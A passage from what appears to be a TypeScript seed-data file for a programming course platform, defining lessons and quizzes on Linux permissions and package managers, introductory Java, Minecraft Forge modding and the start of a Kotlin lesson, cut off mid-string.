  {
    title: 'Permissions',
    content: lessonContent(
      'Permissions',
      `Every file and directory on Linux has an owner, a group, and a set of permissions controlling who can read, write, or execute it.\n\n\`\`\`bash\nls -l notes.txt\n# -rw-r--r-- 1 ada staff 128 Jan 5 10:00 notes.txt\n\`\`\`\n\nThat first cryptic-looking column breaks down into four parts:\n\n\`\`\`\n-  rw-  r--  r--\n│   │    │    │\n│   │    │    └─ others: read only\n│   │    └────── group: read only\n│   └─────────── owner (ada): read and write\n└─────────────── file type (- = regular file, d = directory)\n\`\`\`\n\nEach group of three letters means **r**ead, **w**rite, **e**xecute, in that fixed order, a \`-\` means that permission is absent.\n\n## Changing permissions\n\n\`\`\`bash\nchmod +x deploy.sh       # add execute permission for everyone\nchmod u+w notes.txt      # add write, but only for the (u)ser/owner\nchmod 644 notes.txt      # numeric form: owner rw-, group r--, others r--\n\`\`\`\n\nThe numeric form adds up read (4) + write (2) + execute (1) per group: \`6\` = rw-, \`7\` = rwx, \`4\` = r--. \`644\` is an extremely common default for regular files, \`755\` for scripts and directories (execute lets you \`cd\` into a directory, not just list it).\n\n## Changing ownership\n\n\`\`\`bash\nsudo chown ada:staff notes.txt   # change owner (ada) and group (staff)\n\`\`\`\n\nChanging ownership requires root, since it's a security-sensitive operation, you can't just hand your files off to someone else's ownership without a privileged account authorizing it.`
    ),
    quiz: {
      title: 'Permissions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In "-rw-r--r--", what permissions does the file\'s owner have?',
          options: ['Read only', 'Read and write', 'Read, write, and execute', 'No permissions'],
          answer: 'Read and write',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The numeric permission 644 grants the owner read+write, and group/others read-only.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to add execute permission to a script for everyone is: chmod ____ deploy.sh',
          options: [],
          answer: '+x',
        },
      ],
    },
  },
  {
    title: 'Editors and Packages',
    content: lessonContent(
      'Editors and Packages',
      `The last piece of a real development environment: editing files without a GUI, and installing software the Linux way.\n\n## Terminal text editors\n\nWhen you're already in a terminal (editing a config file on a remote server, for example), a terminal-based editor avoids switching context entirely:\n\n\`\`\`bash\nnano notes.txt   # beginner-friendly, shortcuts shown on screen\nvim notes.txt    # ubiquitous, steeper learning curve, worth learning eventually\n\`\`\`\n\n\`nano\` shows its keyboard shortcuts (like \`^O\` to save) right at the bottom of the screen, making it the easiest place to start. \`vim\` is nearly universal, it's preinstalled on almost every Linux server you'll ever SSH into, which is exactly why it's worth getting comfortable with over time even though \`nano\` is friendlier at first.\n\n## Package managers\n\nInstalling software on Linux almost never means downloading an installer from a website, a **package manager** fetches, installs, and keeps software up to date from a trusted repository:\n\n\`\`\`bash\n# Debian/Ubuntu\nsudo apt update && sudo apt install git\n\n# macOS\nbrew install git\n\n# Cross-platform, no admin rights required\nwebi git\n\`\`\`\n\n\`apt\` is Debian/Ubuntu's package manager, built into the OS. **Homebrew** (\`brew\`) is the de facto standard on macOS, and increasingly used on Linux too. **Webi** is a newer, simpler installer that doesn't require \`sudo\` at all, handy when you don't have admin rights on a machine.\n\n## Setting up a dev environment, end to end\n\n\`\`\`bash\nsudo apt update\nsudo apt install git python3 build-essential\ngit --version\npython3 --version\n\`\`\`\n\nThat's the complete pattern behind setting up almost any machine for development: update your package lists, install the tools you need by name, and verify each one with \`--version\`.`
    ),
    quiz: {
      title: 'Editors and Packages Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main advantage of installing software with a package manager instead of a website installer?',
          options: ['It is always faster to download', 'It fetches trusted, versioned software and keeps it updatable from one place', 'It never requires any configuration', 'Package managers only work offline'],
          answer: 'It fetches trusted, versioned software and keeps it updatable from one place',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'vim is preinstalled on almost every Linux server, which is part of why it is worth learning even though it has a steeper learning curve than nano.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'On Debian/Ubuntu, the command to install a package called git is: sudo apt ____ git',
          options: [],
          answer: 'install',
        },
      ],
    },
  },
];

const javaLessons: SeedLesson[] = [
  {
    title: 'Hello, Java',
    content: lessonContent(
      'Hello, Java',
      `Java is a statically-typed, object-oriented language that runs on the **JVM** (Java Virtual Machine), write once, run anywhere: the same compiled bytecode runs unmodified on any machine with a JVM installed.\n\n## Your first program\n\n\`\`\`java\npublic class Hello {\n    public static void main(String[] args) {\n        System.out.println("Hello, Kodstigen!");\n    }\n}\n\`\`\`\n\nA few things that look unfamiliar if you're coming from Python or JavaScript:\n\n- **Everything lives inside a class.** Java has no free-floating functions, \`main\` must be a method of some class.\n- \`public static void main(String[] args)\` is the fixed, required signature the JVM looks for as the entry point, \`public\` (callable from outside), \`static\` (belongs to the class itself, not an instance), \`void\` (returns nothing), \`String[] args\` (command-line arguments).\n- The **filename must match the public class name** exactly: \`Hello.java\`.\n\n## Compiling and running\n\nJava compiles to an intermediate form called **bytecode**, not directly to native machine code:\n\n\`\`\`bash\njavac Hello.java   # compiles Hello.java into Hello.class (bytecode)\njava Hello          # the JVM runs the bytecode\n\`\`\`\n\nThis two-step process, and the JVM in between, is exactly what makes "write once, run anywhere" true, the same \`.class\` file runs on Windows, macOS, or Linux without recompiling, as long as a JVM is installed.\n\n> [!TIP]\n> \`System.out.println\` is verbose on purpose, it's read as "the \`out\` stream on the \`System\` class, call \`println\`", once you know Java always nests functionality inside classes, the verbosity stops feeling arbitrary.`
    ),
    quiz: {
      title: 'Hello, Java Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the JVM actually execute?',
          options: ['Raw Java source code', 'Compiled bytecode', 'Native machine code compiled per-OS', 'Python bytecode'],
          answer: 'Compiled bytecode',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In Java, a function can exist on its own, outside of any class.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command that compiles Hello.java into bytecode is: ____ Hello.java',
          options: [],
          answer: 'javac',
        },
      ],
    },
  },
  {
    title: 'Variables and Types',
    content: lessonContent(
      'Variables and Types',
      `Java has two fundamentally different kinds of types: **primitives**, and **objects**. Mixing them up is one of the most common early confusions.\n\n## Primitives\n\n\`\`\`java\nint xp = 0;\ndouble ratio = 0.5;\nboolean loggedIn = true;\nchar grade = 'A';\nxp += 10;\n\`\`\`\n\nPrimitives store their value directly, are fixed-size, and are **not** objects, they have no methods, can't be \`null\`, and are always passed by value.\n\n## Objects\n\nEverything else, starting with \`String\`, is an object, a reference to data living on the heap:\n\n\`\`\`java\nString name = "Ada";\nInteger boxedXp = 10;    // the "boxed" object version of int\nname = null;              // objects CAN be null, primitives cannot\n\`\`\`\n\n\`String\` looks like a primitive in everyday use (you can write \`"hello"\` directly), but it's really an object under the hood, with methods like \`.length()\` and \`.toUpperCase()\`.\n\n## Type inference with var\n\nModern Java lets the compiler infer a local variable's type from its initializer:\n\n\`\`\`java\nvar count = 5;          // inferred as int\nvar name = "Ada";        // inferred as String\n\`\`\`\n\n\`var\` is purely a compile-time convenience, Java is still 100% statically typed underneath, \`count\` is genuinely an \`int\` forever, the compiler just saved you from typing it twice.\n\n| | Primitive | Object |\n|---|---|---|\n| Examples | int, double, boolean, char | String, Integer, any class |\n| Can be null | No | Yes |\n| Has methods | No | Yes |\n| Stored | Directly, on the stack | Reference to the heap |`
    ),
    quiz: {
      title: 'Variables and Types Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these can be set to null?',
          options: ['int', 'boolean', 'String', 'char'],
          answer: 'String',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using var still means the variable is statically typed, the compiler just infers the type instead of you writing it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A type like int or boolean that stores its value directly and is never null is called a ____.',
          options: [],
          answer: 'primitive',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Loops',
    content: lessonContent(
      'Control Flow and Loops',
      `Java's control flow will look familiar if you know C-family syntax, curly braces mark blocks, conditions need parentheses.\n\n\`\`\`java\nint xp = 45;\n\nif (xp >= 100) {\n    System.out.println("Level up!");\n} else if (xp >= 50) {\n    System.out.println("Almost there");\n} else {\n    System.out.println("Keep going");\n}\n\`\`\`\n\n## Loops\n\n\`\`\`java\nfor (int i = 0; i < 5; i++) {\n    System.out.println("Iteration " + i);\n}\n\nint[] scores = {90, 85, 77};\nfor (int score : scores) {   // "enhanced for", like Python's for-in\n    System.out.println(score);\n}\n\nint tries = 0;\nwhile (tries < 3) {\n    tries++;\n}\n\`\`\`\n\nThe enhanced \`for (int score : scores)\` form reads as "for each \`score\` in \`scores\`", it's the idiomatic way to iterate when you don't need the index.\n\n## Switch expressions\n\nModern Java's \`switch\` can be used as an **expression** that directly produces a value, not just a statement that runs code:\n\n\`\`\`java\nString tier = switch (xp / 25) {\n    case 0 -> "Bronze";\n    case 1 -> "Silver";\n    case 2 -> "Gold";\n    default -> "Platinum";\n};\n\`\`\`\n\nEach \`case\` uses \`->\` instead of \`:\`, which means no accidental "fallthrough" to the next case, a common bug in older-style \`switch\` statements, and the whole thing evaluates directly to \`tier\`.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does "for (int score : scores)" mean?',
          options: ['Loop while score equals scores', 'Iterate over each element in the scores array', 'Declare a new array called scores', 'Compare score to scores'],
          answer: 'Iterate over each element in the scores array',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A modern switch expression using -> can directly produce a value assigned to a variable.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The loop that keeps running as long as a condition stays true, checked before each iteration, is a ____ loop.',
          options: [],
          answer: 'while',
        },
      ],
    },
  },
  {
    title: 'Methods and Classes',
    content: lessonContent(
      'Methods and Classes',
      `A **class** is a blueprint for objects, bundling data (**fields**) and behavior (**methods**) together, the foundation of Java's object-oriented style.\n\n\`\`\`java\npublic class Student {\n    private String name;\n    private int xp;\n\n    public Student(String name) {   // constructor\n        this.name = name;\n        this.xp = 0;\n    }\n\n    public void gainXp(int amount) {\n        this.xp += amount;\n    }\n\n    public int getXp() {\n        return this.xp;\n    }\n}\n\`\`\`\n\n\`\`\`java\nStudent ada = new Student("Ada");\nada.gainXp(50);\nSystem.out.println(ada.getXp()); // 50\n\`\`\`\n\n- The **constructor** (same name as the class, no return type) runs whenever you \`new\` an instance, setting up its initial state.\n- \`this\` refers to the specific instance a method was called on, needed here because the parameter \`name\` shadows the field \`name\`.\n- \`private\` fields can only be accessed from inside the class itself, forcing outside code to go through methods like \`gainXp\`/\`getXp\` instead of reaching in and mutating state directly, this is **encapsulation**.\n\n## Why private fields plus public methods?\n\n\`getXp()\`/\`gainXp()\` exist instead of a public \`xp\` field so the class controls *how* its state changes, e.g. \`gainXp\` could reject negative amounts, or trigger a level-up check, logic a bare public field could never enforce. This getter/setter pattern is one of the most common in all of Java.`
    ),
    quiz: {
      title: 'Methods and Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What runs automatically when you create a new instance with "new Student(...)"?',
          options: ['The getXp method', 'The constructor', 'The main method', 'Nothing runs automatically'],
          answer: 'The constructor',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A private field can be accessed directly from outside the class it is declared in.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Keeping fields private and only exposing controlled access through methods is called ____.',
          options: [],
          answer: 'encapsulation',
        },
      ],
    },
  },
  {
    title: 'Collections and Generics',
    content: lessonContent(
      'Collections and Generics',
      `Java's **Collections Framework** provides ready-made, reusable data structures, and **generics** let those structures stay type-safe no matter what they hold.\n\n\`\`\`java\nimport java.util.ArrayList;\nimport java.util.List;\n\nList<String> languages = new ArrayList<>();\nlanguages.add("Java");\nlanguages.add("Go");\nSystem.out.println(languages.get(0)); // "Java"\n\nfor (String lang : languages) {\n    System.out.println(lang.toUpperCase());\n}\n\`\`\`\n\n\`List<String>\` is a **generic type**, the \`<String>\` tells the compiler "this list only ever holds \`String\`s", so trying to \`.add(42)\` is a compile error, not a runtime surprise. \`ArrayList\` is the most common concrete implementation, a resizable, array-backed list.\n\n## Maps\n\n\`\`\`java\nimport java.util.HashMap;\nimport java.util.Map;\n\nMap<String, Integer> scores = new HashMap<>();\nscores.put("Ada", 95);\nscores.put("Grace", 98);\n\nSystem.out.println(scores.get("Ada")); // 95\nSystem.out.println(scores.getOrDefault("Bob", 0)); // 0, key doesn't exist\n\`\`\`\n\n\`Map<String, Integer>\` associates keys with values, like Python's dict. \`getOrDefault\` avoids a \`null\` result (and a potential \`NullPointerException\`) when a key might not exist.\n\n## Why generics matter\n\nWithout generics, a collection could only hold \`Object\`, meaning you'd have to cast every single item back to its real type before using it, and the compiler couldn't catch a mistake until it crashed at runtime. Generics push that type checking to compile time, exactly where you want to catch bugs.`
    ),
    quiz: {
      title: 'Collections and Generics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the <String> in List<String> guarantee?',
          options: ['The list can never be empty', 'The list only ever holds String values, checked at compile time', 'The list is automatically sorted', 'Nothing, it is just documentation'],
          answer: 'The list only ever holds String values, checked at compile time',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Map.getOrDefault avoids returning null when a key does not exist in the map.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The most common resizable, array-backed implementation of List in Java is called ____.',
          options: [],
          answer: 'ArrayList',
        },
      ],
    },
  },
  {
    title: 'Interfaces and Inheritance',
    content: lessonContent(
      'Interfaces and Inheritance',
      `Java supports two ways to share behavior across classes: **inheritance** (extending a class) and **interfaces** (implementing a contract). Knowing when to reach for each is core to writing idiomatic Java.\n\n## Inheritance\n\n\`\`\`java\npublic class Animal {\n    protected String name;\n    public Animal(String name) { this.name = name; }\n    public String speak() { return name + " makes a sound"; }\n}\n\npublic class Dog extends Animal {\n    public Dog(String name) { super(name); } // call the parent constructor\n\n    @Override\n    public String speak() {\n        return name + " barks";\n    }\n}\n\`\`\`\n\n\`Dog extends Animal\` inherits its fields and methods, then **overrides** \`speak()\` with its own version. \`super(name)\` calls \`Animal\`'s constructor, since \`Dog\` doesn't own the \`name\` field itself, it inherited it.\n\n## Interfaces\n\nAn interface declares **what** a class must do, without saying **how**:\n\n\`\`\`java\npublic interface Comparable2<T> {\n    int compareTo(T other);\n}\n\npublic class Student implements Comparable2<Student> {\n    int xp;\n    public int compareTo(Student other) {\n        return this.xp - other.xp;\n    }\n}\n\`\`\`\n\nA class can \`implements\` as many interfaces as it wants, but can only \`extends\` **one** class, this is a deliberate Java design decision to avoid the ambiguity of multiple inheritance ("if two parent classes both define \`speak()\` differently, which one wins?").\n\n## Why prefer interfaces?\n\nCode written against an interface (\`List<String>\` instead of \`ArrayList<String>\`) doesn't care which concrete implementation it's handed, \`ArrayList\`, \`LinkedList\`, anything, as long as it implements \`List\`. This is called **programming to an interface**, and it's one of the most valuable habits in all of object-oriented design.`
    ),
    quiz: {
      title: 'Interfaces and Inheritance Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many classes can a single Java class extend?',
          options: ['Zero', 'Exactly one', 'As many as needed', 'Unlimited, same as interfaces'],
          answer: 'Exactly one',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A class can implement multiple interfaces at the same time.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The call super(name) inside a subclass constructor invokes the ____ class\'s constructor.',
          options: [],
          answer: 'parent',
        },
      ],
    },
  },
  {
    title: 'Final Project: Library Management Console App',
    content: lessonContent(
      'Final Project: Library Management Console App',
      `Combine everything from this course into a small, real console application: a library management system.\n\n## Requirements\n\n1. Create a \`Book\` class with fields for title, author, and a checked-out boolean, plus a constructor and getter methods.\n2. Create a \`Library\` class holding a \`List<Book>\`, with methods \`addBook(Book b)\`, \`checkOut(String title)\`, \`returnBook(String title)\`, and \`listAvailable()\`.\n3. Use a \`Map<String, Book>\` (keyed by title) internally if you'd like faster lookups than scanning the list, either approach is fine.\n4. \`main\` should add at least 3 books, check one out, attempt to check out an already-checked-out book (and print a clear message instead of crashing), then list what's still available.\n5. Define at least one interface (e.g. \`Searchable\` with a \`search(String query)\` method) and implement it on \`Library\`.\n\n## Stretch goals\n\n- Add a \`Member\` class and track which member currently has each book checked out.\n- Support returning a book by member name instead of just by title.\n- Sort the available books alphabetically before printing them.\n\nSubmit a link to your finished project below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const minecraftModdingLessons: SeedLesson[] = [
  {
    title: "Setting Up a Forge Mod Development Environment",
    content: lessonContent(
      "Setting Up a Forge Mod Development Environment",
      `Minecraft mods written in Java are built against **Forge**, a modding API and loader that hooks into the base game. Forge ships a **Mod Development Kit (MDK)**, a ready-to-go Gradle project you build your mod on top of instead of starting from nothing.

## What you'll need

- A Java Development Kit matching your target Minecraft version (JDK 17 for modern 1.20.x Forge).
- The Forge MDK for the Minecraft version you're targeting, downloaded from Forge's files page and unzipped into your project folder.
- An IDE with Gradle support, IntelliJ IDEA or Eclipse both work well.

## Getting the MDK running

From inside the unzipped MDK folder:

\`\`\`bash
./gradlew genIntellijRuns
\`\`\`

(\`genEclipseRuns\` for Eclipse instead), this generates run configurations for launching Minecraft with your mod loaded. Then launch the game itself:

\`\`\`bash
./gradlew runClient
\`\`\`

The first run downloads a full Minecraft client and Forge's patched sources, expect it to take a while. If it succeeds, you'll see the normal Minecraft title screen with your (currently empty) mod already loaded.

## mods.toml

Every Forge mod describes itself in \`src/main/resources/META-INF/mods.toml\`:

\`\`\`
modLoader="javafml"
loaderVersion="[47,)"

[[mods]]
modId="examplemod"
version="1.0.0"
displayName="Example Mod"
\`\`\`

\`modId\` is the mod's unique internal identifier, lowercase, no spaces, you'll reference it constantly in code and in every resource file path.`
    ),
    quiz: {
      title: "Forge Setup Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does Forge's MDK provide?",
          options: ["A finished example mod with no code to write","A ready-to-go Gradle project to build a mod on top of","A Minecraft server hosting service","A texture editor"],
          answer: "A ready-to-go Gradle project to build a mod on top of",
        },
        {
          type: 'FILL_BLANK',
          prompt: "A mod's unique internal identifier, declared in mods.toml, is called its ____.",
          options: [],
          answer: "modId",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "The Gradle task runClient launches Minecraft with your mod already loaded.",
          options: ["True","False"],
          answer: "True",
        },
      ],
    },
  },
  {
    title: "The Main Mod Class and the Event Bus",
    content: lessonContent(
      "The Main Mod Class and the Event Bus",
      `Every Forge mod has one main class, annotated with \`@Mod\`, that Forge instantiates automatically when the game loads.

\`\`\`java
package com.example.examplemod;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;

@Mod("examplemod")
public class ExampleMod {
    public ExampleMod() {
        FMLJavaModLoadingContext.get().getModEventBus()
            .addListener(this::commonSetup);
    }

    private void commonSetup(final FMLCommonSetupEvent event) {
        // runs once, early, on both client and dedicated server
    }
}
\`\`\`

The string passed to \`@Mod\` **must match \`modId\`** in \`mods.toml\`, that's how Forge connects the class to the mod's metadata.

## The mod event bus

Forge fires setup and registration events through a **mod event bus**, retrieved with \`FMLJavaModLoadingContext.get().getModEventBus()\`. Registering a listener in the constructor, as above, is the standard place to hook into it, you'll register items and blocks here in the next two lessons.

\`FMLCommonSetupEvent\` fires once, after all registries have finished registering, the right place for setup logic that depends on other mods' content already existing (like inter-mod compatibility), but too early for anything requiring a running world.

> [!WARNING]
> There's a second, separate bus, the **game/Forge event bus** (\`MinecraftForge.EVENT_BUS\`), used for gameplay events like a player breaking a block. Setup and registration events use the *mod* bus, gameplay events use the *Forge* bus, mixing them up is one of the most common beginner mistakes.`
    ),
    quiz: {
      title: "Mod Class & Event Bus Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What must the string passed to @Mod match?",
          options: ["The Java package name","The modId in mods.toml","The main class name","The Minecraft version"],
          answer: "The modId in mods.toml",
        },
        {
          type: 'FILL_BLANK',
          prompt: "Registration and setup listeners are attached to the mod event bus inside the mod's ____.",
          options: [],
          answer: "constructor",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Gameplay events, like a player breaking a block, are fired on the same bus as registration events.",
          options: ["True","False"],
          answer: "False",
        },
      ],
    },
  },
  {
    title: "Registering a Custom Item",
    content: lessonContent(
      "Registering a Custom Item",
      `Forge mods don't create game objects directly, everything (items, blocks, sounds, and more) goes through a **registry**, so the game knows about it consistently across saves, mods, and multiplayer.

## DeferredRegister

\`DeferredRegister\` is the standard, modern pattern for registering content:

\`\`\`java
package com.example.examplemod;

import net.minecraft.world.item.Item;
import net.minecraftforge.registries.DeferredRegister;
import net.minecraftforge.registries.ForgeRegistries;
import net.minecraftforge.registries.RegistryObject;

public class ModItems {
    public static final DeferredRegister<Item> ITEMS =
        DeferredRegister.create(ForgeRegistries.ITEMS, "examplemod");

    public static final RegistryObject<Item> RUBY =
        ITEMS.register("ruby", () -> new Item(new Item.Properties()));
}
\`\`\`

Then hook \`ModItems.ITEMS\` into the mod event bus from the main class constructor:

\`\`\`java
ModItems.ITEMS.register(FMLJavaModLoadingContext.get().getModEventBus());
\`\`\`

\`RegistryObject<Item>\` is a lazy reference, it isn't a real, usable \`Item\` until registration actually completes, call \`.get()\` on it later once the game has finished loading (never at class-load time).

## Making it show up in-game

A registered item exists, but without two more pieces it's invisible and unnamed in the inventory:

1. **A lang file entry**, \`src/main/resources/assets/examplemod/lang/en_us.json\`:
   \`\`\`json
   { "item.examplemod.ruby": "Ruby" }
   \`\`\`
2. **An item model**, \`src/main/resources/assets/examplemod/models/item/ruby.json\`, pointing at a texture in \`assets/examplemod/textures/item/ruby.png\`.

## Creative tab

To make the item easy to find in creative mode, add it to a \`CreativeModeTab\` via a \`BuildCreativeModeTabContentsEvent\` listener, or simply add it to an existing vanilla tab for now, that's a detail you can refine once the basics work.`
    ),
    quiz: {
      title: "Registering Items Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the standard modern pattern for registering a new item in Forge?",
          options: ["Calling new Item() directly in main()","DeferredRegister","Editing Minecraft's source code directly","A JSON-only registration, no Java needed"],
          answer: "DeferredRegister",
        },
        {
          type: 'FILL_BLANK',
          prompt: "A RegistryObject is a ____ reference, it isn't a usable item until registration completes.",
          options: [],
          answer: "lazy",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "An item's display name in the inventory comes from a lang file, not from its registry name.",
          options: ["True","False"],
          answer: "True",
        },
      ],
    },
  },
  {
    title: "Creating a Custom Block",
    content: lessonContent(
      "Creating a Custom Block",
      `Blocks follow the same \`DeferredRegister\` pattern as items, with a bit more configuration for how they behave in the world.

\`\`\`java
package com.example.examplemod;

import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.material.MapColor;
import net.minecraftforge.registries.DeferredRegister;
import net.minecraftforge.registries.ForgeRegistries;
import net.minecraftforge.registries.RegistryObject;

public class ModBlocks {
    public static final DeferredRegister<Block> BLOCKS =
        DeferredRegister.create(ForgeRegistries.BLOCKS, "examplemod");

    public static final RegistryObject<Block> RUBY_ORE =
        BLOCKS.register("ruby_ore", () ->
            new Block(Block.Properties.of()
                .mapColor(MapColor.STONE)
                .strength(3.0f, 3.0f)
                .requiresCorrectToolForDrops()));
}
\`\`\`

\`strength(hardness, resistance)\` controls mining time and explosion resistance, and \`requiresCorrectToolForDrops()\` means the block only drops an item if broken with a tool that meets its harvest level (a pickaxe, in this case), just like vanilla ore.

## Registering the matching BlockItem

A registered block has no inventory representation on its own, you need a companion \`BlockItem\` so it can actually be picked up and placed:

\`\`\`java
public static final RegistryObject<Item> RUBY_ORE_ITEM =
    ModItems.ITEMS.register("ruby_ore", () ->
        new BlockItem(ModBlocks.RUBY_ORE.get(), new Item.Properties()));
\`\`\`

## Blockstates and models

Like items, blocks need JSON resources to actually render:

- \`assets/examplemod/blockstates/ruby_ore.json\`, maps the block's state(s) to a model.
- \`assets/examplemod/models/block/ruby_ore.json\`, describes its geometry and textures (a simple cube uses the built-in \`block/cube_all\` parent).
- \`assets/examplemod/models/item/ruby_ore.json\`, usually just points back at the block model, so it looks the same in the inventory as it does placed.`
    ),
    quiz: {
      title: "Custom Blocks Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does requiresCorrectToolForDrops() control?",
          options: ["How fast the block breaks","Whether the block drops an item unless mined with an adequate tool","The block's color","Whether the block can be placed underwater"],
          answer: "Whether the block drops an item unless mined with an adequate tool",
        },
        {
          type: 'FILL_BLANK',
          prompt: "A block needs a companion ____ registered so it can be picked up and placed like a normal inventory item.",
          options: [],
          answer: "BlockItem",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Blocks are registered with the exact same DeferredRegister pattern used for items, just against a different registry.",
          options: ["True","False"],
          answer: "True",
        },
      ],
    },
  },
  {
    title: "Adding a Crafting Recipe",
    content: lessonContent(
      "Adding a Crafting Recipe",
      `Forge recipes are plain JSON data, no Java required, living under \`data/<modid>/recipes/\`.

## A shaped recipe

\`src/main/resources/data/examplemod/recipes/ruby_block.json\`:

\`\`\`json
{
  "type": "minecraft:crafting_shaped",
  "pattern": [
    "RRR",
    "RRR",
    "RRR"
  ],
  "key": {
    "R": { "item": "examplemod:ruby" }
  },
  "result": {
    "item": "examplemod:ruby_block",
    "count": 1
  }
}
\`\`\`

\`pattern\` is a 3x3 (or smaller) grid where each character maps to an ingredient in \`key\`, blank rows/columns are allowed for recipes smaller than a full crafting grid. The \`type\` tells the game which recipe serializer to use, \`minecraft:crafting_shaped\` respects the exact layout, while \`minecraft:crafting_shapeless\` (no \`pattern\`/\`key\`, just an \`ingredients\` array) ignores placement entirely.

## Recipe advancements

Recipes only show up in a player's recipe book once they've been "unlocked", normally the moment they first obtain one of the ingredients. That unlock condition lives in a matching advancement file, \`data/examplemod/advancements/recipes/.../ruby_block.json\`, with a \`minecraft:recipe_unlocked\` trigger, generated projects and mod-dev tooling can scaffold this for you, but it's worth understanding it's a separate file from the recipe itself.

## Testing it

Rebuild and relaunch with \`./gradlew runClient\`, resource and data files under \`src/main/resources\` are picked up automatically, open your inventory's crafting grid in-game and confirm the recipe actually works.`
    ),
    quiz: {
      title: "Crafting Recipes Quiz",
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Where do Forge crafting recipes live?",
          options: ["Inside the main mod Java class","As JSON files under data/<modid>/recipes/","In mods.toml","They are generated automatically from item names"],
          answer: "As JSON files under data/<modid>/recipes/",
        },
        {
          type: 'FILL_BLANK',
          prompt: "A recipe that ignores item placement in the crafting grid uses the type minecraft:crafting_____.",
          options: [],
          answer: "shapeless",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A recipe automatically appears in a player's recipe book with no additional configuration.",
          options: ["True","False"],
          answer: "False",
        },
      ],
    },
  },
  {
    title: "Final Project: Build a Mini Ore Mod",
    content: lessonContent(
      "Final Project: Build a Mini Ore Mod",
      `Combine registration, blocks, items, and recipes from this course into one small but complete mod: a new ore, and something to craft with it.

## Requirements

1. Register a new item, a raw gem or ingot (e.g. \`ruby\`), using \`DeferredRegister<Item>\`.
2. Register a new ore block (e.g. \`ruby_ore\`) using \`DeferredRegister<Block>\`, with sensible \`strength()\` and \`requiresCorrectToolForDrops()\`, plus its matching \`BlockItem\`.
3. Give both a lang file entry and basic item/block model JSON so they have a name and texture in-game (a solid-color texture is fine, this course is about the code, not art).
4. Add at least one crafting recipe involving your new item, turning it into a block (like a decorative storage block) or a simple tool.
5. Confirm everything works by running \`./gradlew runClient\`, mining your ore, picking up the item, and crafting the recipe in-game.

## Stretch goals

- Add a second tier item/tool that requires your new material plus an existing vanilla one (like sticks) in its recipe.
- Register a custom \`CreativeModeTab\` for your mod instead of relying on vanilla tabs.
- Add a smelting recipe (\`minecraft:smelting\`) that turns your raw ore item into a refined version.

Submit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const kotlinLessons: SeedLesson[] = [
  {
    title: 'Hello, Kotlin',
    content: lessonContent(
      'Hello, Kotlin',
      `Kotlin is a modern, statically-typed language created by JetBrains that runs on the **JVM**, meaning it compiles to the same bytecode as Java and can call Java code (and be called from it) directly. It's Google's officially preferred language for Android development, but it also runs as backend code, compiles to JavaScript, and even to native binaries.\n\n## Your first program\n\n\`\`\`kotlin\nfun main() {\n    println("Hello, Kodstigen!")\n}\n\`\`\`\n\nCompare this to Java's \`Hello\` example, and the difference is immediate:\n\n- No wrapping class is required, \`fun main()\` is a genuine top-level function, Kotlin doesn't force everything to live inside a class.\n- \`println(...)\` instead of \`System.out.println(...)\`, far less ceremony for something you'll type constantly.\n- No semicolons required at the end of lines (though they're legal if you want them).\n\n## Compiling and running\n\n\`\`\`bash\nkotlinc hello.kt -include-runtime -d hello.jar\njava -jar hello.jar\n\`\`\`\n\n\`kotlinc\` is the Kotlin compiler, \`-include-runtime\` bundles the small Kotlin standard library into the jar so it runs anywhere a JVM exists, without a separate Kotlin install.\n\n> [!TIP]\n> Because Kotlin and 